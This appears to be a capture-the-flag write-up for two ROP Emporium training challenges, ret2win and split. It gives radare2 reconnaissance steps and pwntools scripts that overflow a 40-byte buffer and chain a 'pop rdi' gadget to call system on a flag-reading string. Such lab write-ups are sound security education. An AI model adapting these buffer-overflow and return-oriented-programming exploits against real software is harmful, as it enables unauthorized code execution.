# ROP EMPORIUM <a name="ropemp"></a>

***

| Challenge          | Walkthrough                                                                                     |
| ------------       | --------                                                                                        |
| [Ret2Win](#ret2win)| [pdf](https://github.com/Ordered-Chaos/Pwnfolio/blob/master/ROP_Emporium/Writeups/Ret2win64.pdf)|
| [Split](#split)    | [pdf](https://github.com/Ordered-Chaos/Pwnfolio/blob/master/ROP_Emporium/Writeups/Split64.pdf)  |                                                                              
| CallMe             |                                                                                                 |
| Write4             |                                                                                                 |

***

## RET2WIN 64 bit<a name="ret2win"></a>

> ### 1. Problem
>> In this challenge, there is a function called ret2win located somewhere
>> in the binary which can be used to cat the flag.txt file. The goal is to:
>>
>>> - [ ] Find offset of the ret2win function
>>>
>>> - [ ] Find out the buffer length
>>>
>>> - [ ] Overflow the buffer and overwrite `$rsp` with the ret2win address offset

> ### 2. Solution
>> - [X] Find offset of the ret2win function
>>> I used the `> afl` command in radare2 to list the functions with their offsets.
>>> This showed me that the ret2win function was located at address 0x00400756.
>>>
>> - [X] Find out the buffer length
>>> In the ROP Emporium challenges all of the buffers are 40 bytes long.
>>>
>> - [X] Overflow the buffer and overwrite `$rsp` with the ret2win address offset
>>> I used a pwntools script in order to execute the exploit.
~~~python

#!/usr/bin/env python

from pwn import *

elf = context.binary = ELF('ret2win')
context.log_level = 'debug'

padding = cyclic(40)
ret2win = p64(0x00400756)

payload = padding
payload += ret2win

io = process(elf.path)
io.sendline(payload)
io.wait_for_close()
io.recvall()

~~~

**FLAG:**  *ROPE{a_placeholder_32byte_flag!}* 

***

## SPLIT 64 bit<a name="split"></a>

> ### 1. Problem
>> In the split challenge, there exists a function that calls system along with
>> the string `/bin/cat flag.txt` which is all that is needed to get the flag. The 
>> twist is that they are split apart and need to be brought together. The goal here is to:
>>
>>> - [ ] Find the address offset of the system call
>>>
>>> - [ ] Find the address offset of the `/bin/cat flag.txt` string
>>>
>>> - [ ] Find a ROP gadget that can pop our string into `$rdi`
>>>
>>> - [ ] Overflow the buffer, overwrite `$rsp` and execute the exploit

> ### 2. Solution
>> - [X] Find the address offset of the system call
>>> Here I used the `> afl` command in radare2 to list the functions. From there I navigated to 
>>> the *usefulFunction* using `>  usefulFunction` followed by a `> pdf` command to disassemble
>>> the function. This gave me the address of the system call.
>>>
>> - [X] Find the address offset of the `/bin/cat flag.txt` string
>>> I used the `> iz` command in radare2 to print a list of strings in the binary. From here I 
>>> was able to find the address of the `/bin/cat flag.txt` string.
>>>
>> - [X] Find a ROP gadget that can pop our string into `$rdi`
>>> The `> /R pop rdi;` command in radare2 searches through the binary and lists all ROP gadgets
>>> that have the `pop $rdi` instruction. This gave me the address to the gadget.
>>>
>> - [X] Overflow the buffer, overwrite `$rsp` and execute the exploit
>>> As always, I created a pwntools script in order to execute the exploit.
~~~python

#!/usr/bin/env python

from pwn import *

elf = context.binary = ELF('split')  # setting up the envronment
context.log_level = 'debug'       

usefulstring = p64(0x601060)         # 'cat flag.txt' string
systemaddr = p64(0x40074b)           # call to system in usefulFunction
rop = p64(0x4007c3)                  # pop rdi; ret;
padding = cyclic(40)

payload = padding                    # junk to fill up buffer
payload += rop                       # pops '/bin/cat flag.txt' into rdi
payload += usefulstring              # string to be as the argument
payload += systemaddr                # call to system in useful function

io = process(elf.path)
io.sendline(payload)                 # sends payload
io.wait_for_close()                  
flag = io.recvall()
print(flag)

~~~

**FLAG:**  *ROPE{a_placeholder_32byte_flag!}* 

***